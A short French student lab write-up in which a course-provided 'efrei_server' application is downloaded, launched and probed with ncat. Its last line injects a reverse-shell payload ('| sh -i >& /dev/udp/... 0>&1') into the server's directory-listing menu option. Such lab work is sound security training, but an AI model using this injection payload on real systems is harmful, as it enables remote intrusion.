**PARTIE 1**

🌞 Télécharger l'application depuis votre VM

```


[lawerz@localhost ~]$ sudo curl -O https://gitlab.com/it4lik/b3-csec-2024/-/blob/main/efrei_server
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 39784  100 39784    0     0   5780      0  0:00:06  0:00:06 --:--:--  8904
```
```
[lawerz@localhost ~]$ ls "efrei_server"
efrei_server
[lawerz@localhost ~]$ sudo chmod +x efrei_server 
[lawerz@localhost ~]$ ls "efrei_server"
efrei_server
```
🌞 Lancer l'application efrei_server

```
[lawerz@localhost ~]$ LISTEN_ADDRESS=0.0.0.0 ./efrei_server
Warning: You should consider setting the environment variable LOG_DIR. Defaults to /tmp.
Server started. Listening on ('10.0.2.15', 8888)...
```
```
[lawerz@localhost ~]$ ss -tuln | grep 8888
tcp   LISTEN 0      100    10.0.2.15:8888      0.0.0.0:
```

```
PS /Users/MBP-2015> ncat 10.O.2.15 8888
Hello ! Tu veux des infos sur quoi ?
1) cpu
2) ram
3) disk
4) ls un dossier

Ton choix (1, 2, 3 ou 4) :
```
```
Ton choix (1, 2, 3 ou 4) : 4
Exécuter la commande ls vers le dossier : /etc | sh -i >& /dev/udp/10.0.2.16/4242 0>&1
```





